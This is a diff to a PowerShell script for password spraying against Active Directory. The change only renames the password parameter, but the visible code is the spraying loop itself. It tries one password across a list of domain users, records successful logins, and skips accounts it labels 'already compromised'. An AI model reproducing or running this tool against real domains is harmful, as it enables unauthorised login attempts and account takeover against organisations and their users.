@@ -4,14 +4,14 @@ Function adcheck {
 }
  
 Function adlogin {
-  param($userlist,$domain,$pwd)
+  param($userlist,$domain,$pswd)
 
-  if (!$pwd) {
+  if (!$pswd) {
     Write-Host "usage: adlogin <userlist.txt> <domain> <password>"
     Write-Host " e.g.: adlogin users.txt domain.com P@ssw0rd`n"
     return
   }
-  $results = ".\adlogin.$pwd.txt"
+  $results = ".\adlogin.$pswd.txt"
 
   foreach($line in gc $userlist) {
     $x = (gc $results -EA SilentlyContinue | sls "^$line,.*,True$")
@@ -19,13 +19,13 @@ Function adlogin {
       Write-Host "user $line already compromised"
       continue
     }
-    $x = (gc $results | sls -CaseSensitive "^$line,$pwd,")
+    $x = (gc $results | sls -CaseSensitive "^$line,$pswd,")
     if ($x) {
-      Write-Host "user $line with $pwd already tried"
+      Write-Host "user $line with $pswd already tried"
       continue
     }
-    $output = "$line,$pwd,"
-    $output += adcheck "$domain\$line" "$pwd"
+    $output = "$line,$pswd,"
+    $output += adcheck "$domain\$line" "$pswd"
     Write-Host "$output"
     echo $output >>$results
   }
